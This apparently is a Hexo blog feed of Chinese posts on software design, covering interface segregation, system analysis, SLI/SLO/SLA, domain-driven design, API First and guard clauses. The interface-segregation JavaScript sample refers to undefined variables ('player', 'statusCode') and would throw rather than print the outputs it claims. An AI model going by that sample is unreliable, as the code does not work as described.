&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20101</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重構完之後發現，只有 AdvancedPlayer 才需要有 hasDesiredNameOrHighAgility，所以再把腳色拆分進行重構，讓每個玩家類型都<strong>分別具有</strong>自己的檢查邏輯，基本玩家和進階玩家<strong>分別知道</strong>如何檢查自己的條件，這就是介面隔離。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定義一個函數，用於檢查玩家的健康狀態</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isHealthy</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> player.<span class="property">health</span> &gt; <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定義一個函數，用於檢查玩家的名稱和傷害值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hasDesiredNameOrLowDamage</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> player.<span class="property">name</span> === <span class="string">&quot;foo&quot;</span> || player.<span class="property">damage</span> &lt; <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定義一個函數，用於檢查玩家的名稱和敏捷度</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hasDesiredNameOrHighAgility</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> player.<span class="property">name</span> !== <span class="string">&quot;bar&quot;</span> || player.<span class="property">agility</span> &gt; <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定義一個基本玩家函數，接受包含玩家屬性的物件作為參數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createPlayer</span>(<span class="params">playerData</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; name, health, damage &#125; = playerData;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    name,</span><br><span class="line">    health,</span><br><span class="line">    damage,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通用的檢查函數，每個玩家都可以使用</span></span><br><span class="line">    <span class="title function_">checkPlayerCondition</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">isHealthy</span>(player) &amp;&amp; <span class="title function_">hasDesiredNameOrLowDamage</span>(player);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定義進階玩家函數，接受包含進階玩家屬性的物件作為參數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createAdvancedPlayer</span>(<span class="params">advancedPlayerData</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; name, health, damage, agility &#125; = advancedPlayerData;</span><br><span class="line">  <span class="keyword">const</span> player = <span class="title function_">createPlayer</span>(&#123; name, health, damage &#125;);</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    ...player,</span><br><span class="line">    agility,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 進階玩家特有的檢查函數</span></span><br><span class="line">    <span class="title function_">checkAdvancedPlayerCondition</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">hasDesiredNameOrHighAgility</span>(player);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通用的處理玩家資料函數，接受任何類型的玩家物件作為參數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processPlayerData</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (player.<span class="title function_">checkPlayerCondition</span>()) &#123;</span><br><span class="line">    <span class="comment">// 做一些基本玩家的操作</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;player.name&#125;</span> 符合基本條件`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    player?.<span class="property">checkAdvancedPlayerCondition</span> &amp;&amp;</span><br><span class="line">    player?.<span class="title function_">checkAdvancedPlayerCondition</span>()</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// 做一些進階玩家的操作</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;player.name&#125;</span> 符合進階條件`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 非常長的函數內容...</span></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20100</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20101</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立玩家物件，使用包含屬性的物件作為參數</span></span><br><span class="line"><span class="keyword">const</span> player1 = <span class="title function_">createPlayer</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家1&quot;</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">10</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> player2 = <span class="title function_">createAdvancedPlayer</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家2&quot;</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">150</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">15</span>,</span><br><span class="line">  <span class="attr">agility</span>: <span class="number">20</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 處理玩家資料</span></span><br><span class="line"><span class="title function_">processPlayerData</span>(player1);</span><br><span class="line"><span class="comment">// 輸出:玩家1 符合基本條件</span></span><br><span class="line"><span class="title function_">processPlayerData</span>(player2);</span><br><span class="line"><span class="comment">// 輸出:玩家2 符合基本條件</span></span><br><span class="line"><span class="comment">// 輸出:玩家2 符合進階條件</span></span><br></pre></td></tr></table></figure><p><code>processPlayerData</code> 函數最後不需要知道你是哪種特定的玩家類型，只關心玩家是否符合 Player 介面，如果未來新增其他類型的玩家，我們只需透過 Player 介面建立一個新的玩家類別，而不需要修改現有的程式碼。</p><p>透過這樣的設計降低了不同角色之間的耦合性，這就是介面隔離原則 (Interface Segregation Principle)，介面隔離原則有助於確保程式碼的結構清晰，並使不同部分之間的依賴關係簡化，同時支持未來的擴充和修改。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>決定成敗的系統細節分析</title>
      <link href="/2023/10/04/simplify-your-life/system-analytics/"/>
      <url>/2023/10/04/simplify-your-life/system-analytics/</url>
      
        <content type="html"><![CDATA[<p>就像裝潢房子一樣，如果不提早確認細節，可能會在後期發現不必要的問題。</p><p>例如因上班忙碌並未提早確認天花板的細節，結果工人裝潢到一半周末才發現有多個為了崁燈預留的洞，但實際不需要也不想要那麼多燈，這顯示了及早溝通和確認細節的重要性。</p><p>在專案初期，不應該期待一次做好完美的產品，要做的反而是最小可行性商品，傳統的瀑布式開發因為開發週期過長，很難知道正在開發的是鑽石還是未爆彈，就好像裝潢一樣需要提早去進行確認施工狀況一樣。</p><p>在軟體開發上應該以快速迭代的方式不斷優化和擴展，並且在過程中收集使用者的回饋，迭代過程中持續改進系統，協助調整需求以反映實際需求的變化。</p><h2 id="系統分析"><a href="#系統分析" class="headerlink" title="系統分析"></a>系統分析</h2><p>系統分析上保持透明度是關鍵，要確保大家都了解目前的狀況，成功的系統分析要同時可以滿足使用者的需求、讓老闆可以賺錢、讓開發者知道商業模式該怎麼運作。</p><p>產品管理會是一個四步驟的循環:</p><ul><li>蒐集: 收集資訊、資料、文件或其他相關材料，例如調查、研究、使用者回饋、日誌文件、資料庫等等</li><li>處理: 確保被蒐集的資訊變得有用且易於理解，包括資料清理、資料轉換、分析和編排，將資訊轉化為可用於做出決策或進一步操作的形式</li><li>組織: 將資訊組織成有條理的結構，建立目錄、分類、標籤、資料庫、文件結構等等</li><li>解構: 將複雜的資訊或系統拆分為其基本組成部分或元素的過程</li></ul><p>系統分析會有幾個重點:</p><ul><li>確定全貌: 在專案開始前，全貌的理解非常關鍵</li><li>需求澄清: 避免在開發過程中出現需求變更和不確定性</li><li>使用者故事拆分: 把大型用戶故事分解為小型、可管理的任務，更容易估算和實現</li><li>確定優先權: 在有限的時間內交付最有價值的功能</li></ul><p>系統分析就像一盞探照燈一樣，照亮產品的路徑並引導團隊進行產品管理和開發</p><ul><li>整理需求文件: 將所有需求整理到一個統一的位置，確保文件在不同階段保持更新和版本控制，以避免混淆並確保使用最新資訊</li><li>分析使用者流程: 使用流程圖或流程圖分析操作流程，逐步的改進和優化系統設計</li><li>建立概念模型: 建立系統中的實體、屬性和關係，協助大家更快理解系統的結構</li><li>定義系統架構: 顯示系統的不同模組、組件和其間的關係，確保系統設計合理且易於維護</li><li>檢討和回顧: 蒐集和處理雜務、檢討系統運作、更新需求清單內容</li></ul><h2 id="產品開發"><a href="#產品開發" class="headerlink" title="產品開發"></a>產品開發</h2><p>產品開發會把一個產品切割成許多細小的任務，在產品開發上通常會分成規劃過的和臨時發生的兩種任務</p><ul><li>規劃過的行動是有目標的</li><li>臨時發生的行動需要根據情況迅速做出反應</li></ul><p>開發的任務在評估上會分成兩個指標來評估</p><ul><li>Definition of Done (DoD): 代表了一個特定工作項目完成的標準和要求，通常由團隊制定，以確保在交付工作項目時遵循一致的標準</li><li>Key Performance Indicators (KPI) : 用於衡量組織、專案或流程績效的量化指標，主要用來追蹤和評估特定目標的達成程度，通常與業務目標和策略相關</li></ul><p>DoD 和 KPIs 兩者都在專案管理和業務中扮演著重要的角色，測量和評估系統的狀態是改善的第一步，透過指標有助於確定系統的下一步該怎麼調整和優化。</p><p>系統分析過程中我們需要依照 DoD 和 KPIs 適當的進行取捨，盡可能的在有限的人力與時間內交付最有價值的功能。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>照三餐改變的系統與環境</title>
      <link href="/2023/10/03/simplify-your-life/systems-and-environments-altered-by-three-meals-a-day/"/>
      <url>/2023/10/03/simplify-your-life/systems-and-environments-altered-by-three-meals-a-day/</url>
      
        <content type="html"><![CDATA[<p>如何管理和維護各種系統，以確保正常運行並適應不斷變化的環境?</p><p>沒有系統可以獨立存在，每個系統都存在於更大的生態系統中，並受到周圍環境和其他系統的影響。</p><p>就好比居住的空間總會受到家人、室友、鄰居的好壞而影響生活品質，該怎麼衡量與取捨?</p><h2 id="資源管理"><a href="#資源管理" class="headerlink" title="資源管理"></a>資源管理</h2><blockquote><p>道生一，一生二，二生三，三生萬物</p></blockquote><p>事物都相互關聯並依賴於彼此，系統間互動是不可避免的，因此必須適應和應對這些變化。</p><p>舉例來說許多我們日常生活中依賴的系統，例如冰箱和冷氣，都需要穩定的電力供應才能正常運作。</p><p>如果缺乏必要的資源，系統將無法達到它們的預期功能，這就強調了資源管理的重要性。</p><p><a href="https://linyencheng.github.io/2023/09/27/simplify-your-life/cost-of-software-development/">軟體開發常見會消耗資源的成本</a>包含</p><ul><li>流程成本: 目標是減少流程，每多一道流程就增加出錯的機率</li><li>理解成本: 目標是可讀性高的程式碼</li><li>修改成本: 目標是可維護性高的程式碼</li><li>執行成本: 目標是降低時間與空間複雜度</li><li>測試成本: 目標是增加自動化的比例，降低人工</li><li>技術成本: 目標是減少專案的入門門檻</li></ul><h2 id="監控"><a href="#監控" class="headerlink" title="監控"></a>監控</h2><p>環境會隨著時間改變，也因此會影響系統的運作流程和產出，靜止的系統並不存在，存在的是平衡。</p><p>在技術和工程領域 Entropy (熵) 的概念也非常重要，Entropy 表示系統的無序度並且會趨向於最大亂度，因此系統管理需要防止過度的混亂，以確保穩定性和效能。</p><p>系統通常處於不斷變化的狀態，因此需要不斷監控和管理系統應對這種變化以保持系統平衡。</p><p>監控上需要關注時間順序、流程順序和容錯空間，以確保系統的可靠性和穩定性</p><ul><li>時間順序: 事件發生的順序</li><li>流程順序: 涉及流程的步驟和執行順序</li><li>容錯空間: 是指系統中的容錯機制，用於處理錯誤和故障</li></ul><p>透過商業模型理解變化去定義正常值的上下界範圍，可以更好地識別系統問題並採取相應的措施。</p><h2 id="服務水準指標與目標"><a href="#服務水準指標與目標" class="headerlink" title="服務水準指標與目標"></a>服務水準指標與目標</h2><p>在 Site Reliability Engineering (SRE) 領域通常透過 Service Level Indicator (SLI) 和 Service Level Objective (SLO) 兩個指標來評估我們的系統，並透過指標管理系統和維護系統以確保其正常運行和適應變化。</p><h3 id="Service-Level-Indicator"><a href="#Service-Level-Indicator" class="headerlink" title="Service Level Indicator"></a>Service Level Indicator</h3><blockquote><p>Service Level Indicator (SLI) 是用來測量實際性能的數據</p></blockquote><p>SLI 通常是基於數據和指標的量化測量，例如服務的響應時間、錯誤率、可用性等，用來定義服務的實際性能，並提供了關於服務表現的客觀數據，一種衡量服務性能的具體指標或度量標準。</p><ul><li>每個請求都在 500ms 內可以回應</li><li>發生 HTTP Response Code 500 的次數</li></ul><h3 id="Service-Level-Objective"><a href="#Service-Level-Objective" class="headerlink" title="Service Level Objective"></a>Service Level Objective</h3><blockquote><p>Service Level Objective (SLO) 是設定的性能目標</p></blockquote><p>SLO 通常基於 SLI 設定可量化的目標用來衡量服務的期望性能水準，定義了一個服務在特定條件下應該達到的效能，例如某個服務的響應時間應該在多少毫秒以內。</p><p>在系統中重要的是容錯和高可用性，例如系統應該在 99.999% 的時間內可用，以確保最小的中斷時間。</p><h2 id="Service-Level-Agreement"><a href="#Service-Level-Agreement" class="headerlink" title="Service Level Agreement"></a>Service Level Agreement</h2><blockquote><p>Service Level Agreement (SLA) 是一種正式的合約或協議</p></blockquote><p>在企業和服務提供方面透過服務水準協議 (SLA)，用於確定服務提供者應遵守的服務水平標準，通常基於 SLO 規定性能、可用性和支援方面的承諾，但更具有法律約束力。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建模和收納 X 豆漿和油條</title>
      <link href="/2023/10/02/simplify-your-life/api-first-with-domain-model/"/>
      <url>/2023/10/02/simplify-your-life/api-first-with-domain-model/</url>
      
        <content type="html"><![CDATA[<p>當我們要準備買東西的時候，要考慮家裡有沒有空間，反之在室內設計時預留空間也很重要。</p><p>在前端開發包括需求分析、定義用戶流程、確定元件，然後進行系統開發，在系統設計的時候我們又該預留什麼，該依照什麼去進行設計?</p><blockquote><p>分析需求 → 定義 User Flow 和確認元件 → 系統撰寫</p></blockquote><p>做生意的本質是商業，在各個領域中除了技術本身外最重要的就是商業邏輯。</p><p>Domain-Driven Design (DDD) 提供了一種軟體設計和開發方法，強調以業務邏輯和領域 (Domain) 為核心基礎來進行軟體開發。</p><p>謎之音: 大多數情況實際上是 <del>Deadline Driven Development</del></p><h2 id="Domain-Driven-Design"><a href="#Domain-Driven-Design" class="headerlink" title="Domain Driven Design"></a>Domain Driven Design</h2><p><a href="https://linyencheng.github.io/2022/04/30/thinking-domain-driven-design/">Domain Driven Design</a> 分成三個步驟</p><ol><li>列出需要解決的商業問題</li><li>進行建模</li><li>把商業模型變成可以 POC 程式碼</li></ol><blockquote><p>跨部門溝通的目標是建立 Shared Mental Model</p></blockquote><p>利用領域模型 (Domain Model)、領域詞彙 (Domain Terms)、通用語言 (Ubiquitous Language) 來設計和描述系統，進而可以更快的去了解和在各部門同步使用者的流程、商業模式、系統的運行。</p><h3 id="Domain-Model"><a href="#Domain-Model" class="headerlink" title="Domain Model"></a>Domain Model</h3><p>定義領域模型，在商業的世界中除了實作的工程師外最重要的就是該領域的專家 (Domain Expert)。</p><p>Domain Model 是一種設計方法，主要著重於定義和建立應用程式的領域模型，這個模型反映了應用程式核心概念和實體之間的關係。</p><p>建立領域模型的目的是讓系統能在早期就看到全貌，並持續進行細節的設計, 而不是房子蓋到哪裡才想到哪裡。</p><p>就像常見的微服務中 API 互相呼叫可能產生複雜的網路結構，並且讓問題處理變得困難，Domain Model 有助於解決複雜的業務邏輯和需求，讓開發團隊更容易理解並實現應用程式的核心功能。</p><h3 id="Open-Closed-Principle"><a href="#Open-Closed-Principle" class="headerlink" title="Open-Closed Principle"></a>Open-Closed Principle</h3><p>建模這件事情來說有點像是定義房屋的結構，而建模可以盡可能的遵守開放封閉原則。</p><blockquote><p>對於擴展是開放的，但對於修改是封閉的</p></blockquote><p>某些規劃需要提前考慮，例如在蓋房子時預留冷氣位置和窗戶開口，因為房屋的結構不允許輕易地修改。</p><ul><li><strong>擴展開放</strong>: 可以客製各式的家具</li><li><strong>修改封閉</strong>: 房屋結構更動</li></ul><p>有時候老闆可能會覺得只要換個元件就好了，可是其實換元件就等於整個重寫，所以在系統設計時就要以這樣的理念去設計。</p><h3 id="API-First"><a href="#API-First" class="headerlink" title="API First"></a>API First</h3><p>API First 單純是一個術語，關鍵還是在要解決的商業問題。</p><p>API-First 首先要對資源和 URL 進行建模，建模的內容則是依照剛剛專家所定義出的領域模型，依照商業問題把該做好做對的事情列出來，選擇正確的資源並確保正確的細粒度非常重要，這樣客戶就能夠獲得所需的功能，並實現靈活性和易維護性。</p><p>API First 是一種開發方法，API 本身提供了<a href="https://linyencheng.github.io/2023/10/01/simplify-your-life/inversion-of-control/#Inversion-of-Control">控制反轉的機制</a>，強調在開發應用程式時優先設計和定義應用程式介面 (API)，這包括進入點、資料格式、請求和回應等方面的設計，從 API 設計開始，就是從內容出發，然後著手實現前端和後端系統。</p><ul><li><strong>促進團隊協作</strong>：不同的團隊和開發者之間協作可以同時根據 API 規格進行工作</li><li><strong>支持前後端分離</strong>：前後端分離時前端和後端團隊能夠獨立開發</li></ul>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>失控的理智 X 到底有多少需求和條件</title>
      <link href="/2023/10/01/simplify-your-life/inversion-of-control/"/>
      <url>/2023/10/01/simplify-your-life/inversion-of-control/</url>
      
        <content type="html"><![CDATA[<p>當我們想要整理和分類物品的時候，會有許多判斷和想法，通常會將物品按照特定的步驟分類</p><ol><li>依照類型: 把不須冷藏食物放櫃子、需冷層或冷凍食物放在冰箱中</li><li>依照大小: 確定空間是否足夠大來容納一個物品</li><li>依照用途: 蔬菜放下層、冷凍食品放上層</li><li>依照期限: 期限長短由內至外排序</li></ol><p>在程式裡面的體現就是 if-else 條件語句，根據不同的條件執行不同的程式碼塊，舉個例子來看看</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始版本只有基本角色屬性</span></span><br><span class="line"><span class="keyword">const</span> player1 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家1&quot;</span>,</span><br><span class="line">  <span class="attr">level</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">10</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一段時間後，遊戲需要更多的角色屬性</span></span><br><span class="line"><span class="keyword">const</span> player2 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家2&quot;</span>,</span><br><span class="line">  <span class="attr">level</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">150</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">15</span>,</span><br><span class="line">  <span class="attr">agility</span>: <span class="number">20</span>, <span class="comment">// 新需求：敏捷度</span></span><br><span class="line">  <span class="attr">inventory</span>: [<span class="string">&quot;劍&quot;</span>, <span class="string">&quot;盾&quot;</span>], <span class="comment">// 新需求：背包</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合起來</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processPlayerData</span>(<span class="params"></span></span><br><span class="line"><span class="params">  name,</span></span><br><span class="line"><span class="params">  level,</span></span><br><span class="line"><span class="params">  health,</span></span><br><span class="line"><span class="params">  damage,</span></span><br><span class="line"><span class="params">  agility,</span></span><br><span class="line"><span class="params">  inventory,</span></span><br><span class="line"><span class="params">  statusCode</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    health &gt; <span class="number">10</span> &amp;&amp;</span><br><span class="line">    (name === <span class="string">&quot;foo&quot;</span> || damage &lt; <span class="number">5</span>) &amp;&amp;</span><br><span class="line">    (name !== <span class="string">&quot;bar&quot;</span> || agility &gt; <span class="number">20</span>)</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 非常長的函數內容...</span></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20100</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20101</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的例子中，我們就會發現判斷的條件越來越多，隨著角色的擴充邏輯就會漸漸失控。</p><p>延續剛剛的例子，如果今天收到老闆新的需求希望成年的使用者可以多使用額外的隱藏功能，這樣一來是不是又要再一次的複雜化我們的程式呢?</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 檢查玩家是否成年</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isPlayerAdult</span>(<span class="params">player</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> player.<span class="property">age</span> &gt;= <span class="number">18</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小編在過去幾年的經驗當中有體驗過底下四種邏輯控制的方法，各有各的好處可以依照情境使用</p><ul><li>Guard Clause</li><li>Railway Programming</li><li>Strategy Pattern</li><li>Inversion of Control</li></ul><h2 id="Guard-Clause"><a href="#Guard-Clause" class="headerlink" title="Guard Clause"></a>Guard Clause</h2><p>Guard Clause 是 JavaScript 程式碼中的一種常見技巧，目標是為了取代複雜的 if-else 判斷語句。</p><p>守衛的目的主要提前檢查並處理錯誤，只要提早發現錯誤就提早處理錯誤並提早跳出。</p><p>以剛剛的年齡判斷來說 Guard Clause 的範例如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkAge</span>(<span class="params">age</span>) &#123;</span><br><span class="line">  <span class="comment">// 使用 Guard Clause 檢查年齡是否小於 0</span></span><br><span class="line">  <span class="keyword">if</span> (age &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;年齡不能為負數&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">// 提前返回，避免後續程式執行</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用 Guard Clause 檢查年齡是否小於 18</span></span><br><span class="line">  <span class="keyword">if</span> (age &lt; <span class="number">18</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你尚未成年&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">// 提前返回，避免後續程式執行</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果年齡符合標準，執行後續操作</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你是一個成年人&quot;</span>);</span><br><span class="line">  <span class="comment">// 這裡可以繼續執行其他操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 測試函數</span></span><br><span class="line"><span class="title function_">checkAge</span>(<span class="number">25</span>); <span class="comment">// 你是一個成年人</span></span><br><span class="line"><span class="title function_">checkAge</span>(<span class="number">12</span>); <span class="comment">// 你尚未成年</span></span><br><span class="line"><span class="title function_">checkAge</span>(-<span class="number">5</span>); <span class="comment">// 年齡不能為負數</span></span><br></pre></td></tr></table></figure><p>在這個例子中，我們使用了兩個 Guard Clause 來檢查不合格的情況，即年齡是否小於 0 和是否小於 18，如果發現不符合成年人條件，函式會提前結束，並輸出相應的訊息。</p><p>Guard clauses 在 JavaScript 中的使用場景通常包括檢查函數的參數，處理邊界情況，確保數據有效性，並提前處理錯誤。</p><p>這有助於減少錯誤和不正確的操作，同時提高了程式碼的可靠性和可讀性。</p><h2 id="Railway-Programming"><a href="#Railway-Programming" class="headerlink" title="Railway Programming"></a>Railway Programming</h2><p>Railway Programming 通常是指使用 Functional Programming 